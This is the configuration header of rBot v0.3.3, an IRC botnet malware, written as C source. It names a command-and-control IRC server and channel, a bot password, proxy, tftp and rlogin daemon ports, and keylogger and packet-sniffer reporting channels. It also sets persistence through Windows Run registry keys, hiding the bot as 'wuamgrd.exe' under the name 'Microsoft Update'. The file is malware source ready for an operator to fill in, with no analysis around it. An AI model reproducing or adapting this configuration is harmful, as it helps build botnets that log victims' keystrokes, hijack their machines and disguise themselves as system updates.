// bot configuration (generic) - doesn't need to be encrypted
int port = 6668;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12221;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = FALSE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 4;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "r01";						// bot id
char version[] = "[rBot v0.3.3]";		// Bots !version reply
char password[] = "changeme";					// bot password
char server[] = "irc.groupakt.biz";		// server
char serverpass[] = "";						// server password
char channel[] = "#rbot2";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "wuamgrd.exe";			// destination file name
char keylogfile[] = "keys.txt";				// keylog filename
char valuename[] = "Microsoft Update";		// value name for autostart
char nickconst[] = "rBot|";					// first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "-x+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "";					// Channel where exploit messages get redirected
char keylogchan[] = "";						// Channel where keylog messages get redirected
char psniffchan[] = "";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*.net",
	"*@*.com"
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
